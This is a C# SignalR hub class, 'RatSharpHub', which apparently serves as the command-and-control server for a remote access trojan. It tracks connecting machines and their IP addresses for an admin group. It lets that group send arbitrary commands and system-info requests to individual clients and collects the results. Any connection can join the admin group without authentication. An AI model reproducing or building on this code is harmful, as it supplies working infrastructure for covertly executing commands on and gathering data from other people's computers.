using System;
using System.Net;
using System.Threading.Tasks;
using Microsoft.AspNetCore.SignalR;

namespace Server.Hubs;

public class RatSharpHub : Hub<IRatSharpClient>
{
  #region Overrides

  public override async Task OnConnectedAsync()
  {
    IPAddress clientIp = Context.GetHttpContext()!.Connection.RemoteIpAddress!;
    await Clients.Group("Admin").ReceiveNewClientConnected(Context.ConnectionId, clientIp);
    await base.OnConnectedAsync();
  }

  public override async Task OnDisconnectedAsync(Exception? exception)
  {
    await Clients.Group("Admin").ReceiveClientDisconnected(Context.ConnectionId);
    await base.OnDisconnectedAsync(exception);
  }

  #endregion

  #region Hub methods invoked by Admin client

  public async Task IdentifyAsAdmin()
  {
    await Groups.AddToGroupAsync(Context.ConnectionId, "Admin");
  }

  public async Task SendExecuteCommandRequest(string clientToken, string command)
  {
    await Clients.User(clientToken).ReceiveExecuteCommandRequest(command);
  }

  public async Task SendSystemInfoRequest(string clientToken)
  {
    await Clients.User(clientToken).ReceiveSystemInfoRequest();
  }

  #endregion

  #region Hub methods invoked by regular Clients

  public async Task SendExecuteCommandResponse(string commandOutput)
  {
    await Clients.Group("Admin").ReceiveExecuteCommandResponse(Context.ConnectionId, commandOutput);
  }

  public async Task SendSystemInfoResponse(string systemInfo)
  {
    await Clients.Group("Admin").ReceiveSystemInfoResponse(Context.ConnectionId, systemInfo);
  }

  #endregion
}

public interface IRatSharpClient
{
  #region AdminClient methods

  public Task ReceiveNewClientConnected(string clientToken, IPAddress clientIp);
  public Task ReceiveClientDisconnected(string clientToken);
  public Task ReceiveExecuteCommandResponse(string clientToken, string commandOutput);
  public Task ReceiveSystemInfoResponse(string clientToken, string systemInfo);

  #endregion

  #region RegularClient methods

  public Task ReceiveExecuteCommandRequest(string command);
  public Task ReceiveSystemInfoRequest();

  #endregion
}